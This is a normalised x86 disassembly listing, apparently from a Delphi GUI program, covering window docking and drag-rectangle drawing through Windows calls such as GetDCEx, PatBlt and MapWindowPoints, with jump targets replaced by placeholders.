cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_439f10
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44418c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43f888
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_439fb8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_439f74
mov ecx eax
xor edx edx
xor eax eax
call sub_412be0
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_440d58
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412c08
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_444300
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_444300
pop ecx
mov eax ebx
call sub_403198
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_444300
pop ecx
sub_444334
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_444300
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403198
xor eax eax
mov [ esi + 0x64 ] eax
sub_444390
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4433a0
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4443cc
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4443cc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_444639
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x8 ]
pop eax
call sub_4041b0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax [ ebx + 0x14 ]
call sub_442b2c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x10 ]
pop eax
call sub_4041b0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444640
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_442edc
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_443054
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_443090
mov eax [ ebx + 0x18 ]
call sub_442edc
mov [ edx + 0x18 ] eax
push esi
push sub_444bdc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_443408
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_443090
mov eax [ esi + 0x64 ]
call sub_443054
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403198
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_444bb4
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403198
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_442bd8
mov edx eax
mov eax edi
call sub_44307c
mov eax edi
call sub_442edc
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_444bdc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_443408
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_444bdc
mov edx [ eax + 0x14 ]
mov eax esi
call sub_443408
mov eax [ ebx + 0x14 ]
call sub_403198
mov eax edi
call sub_403198
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_444648
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43f888
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407c90
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44307c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43f7f4
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44307c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_444a64
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_444bdc
xor edx edx
mov eax edi
call sub_443408
sub_444724
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_443054
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402990
mov edx eax
mov eax ebx
call sub_44307c
sub_444760
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_4447cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041a8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4447d2
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4447d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_444887
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_442de4
mov eax [ ebp - 0x8 ]
call sub_444760
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4447d8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44488e
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4447d8
pop ecx
sub_444894
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4449cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44497c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43f7f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444983
mov eax [ ebp - 0x10 ]
call sub_403198
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_444760
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43f808
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_444983
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4447d8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449d4
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
sub_4449dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44312c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_443154
call sub_4449dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44312c
call sub_4449dc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_442b5c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_443054
mov edx eax
mov eax ebx
call sub_44307c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44307c
jmp r-xdata
sub_444a64
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4449dc
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_444aa8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_443054
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44307c
sub_444ad8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_440d58
mov edx eax
mov eax [ rw-data ]
call sub_445638
mov eax [ ebx + 0x14 ]
call sub_440d58
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_444bec
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_444b38
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_445638
mov eax ebx
call sub_444bec
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44307c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44307c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_444a64
push ebx
push sub_444bdc
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_443408
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_444bb4
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43f7f4
test eax eax
jle r-xdata
push ebx
push sub_444bdc
xor edx edx
mov eax ebx
call sub_443408
sub_444bec
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_442c20
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_442c20
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_442c8c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_442c8c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d64c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_444cd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_444cd8
pop ecx
mov eax ebx
call sub_443054
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443054
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_444cd8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_443054
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4242d4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_444d68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443054
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_442bd8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_443054
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_444cd8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444db8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_439f10
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439f10
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_444e34
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_442ae4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_442b90
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_443138
test eax eax
je r-xdata
mov eax esi
call sub_442b5c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_444bdc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_443408
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_443138
mov edx [ ebx + 0x20 ]
call sub_443090
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_444e34
pop ecx
sub_444eb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_442b40
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_442b40
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_443138
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_444eb4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_444bdc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_443408
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_442d3c
mov eax edi
call sub_44312c
test eax eax
je r-xdata
mov eax edi
call sub_443138
mov esi eax
mov eax esi
call sub_443054
push eax
mov eax esi
call sub_442b90
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44312c
call sub_443054
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_443054
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44307c
mov eax esi
call sub_443054
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44307c
mov eax edi
call sub_443138
call sub_4430cc
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_442b90
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44307c
mov eax edi
call sub_44312c
call sub_4430cc
mov bl 0x1
jmp r-xdata
sub_444fec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4433a0
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412bb8
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
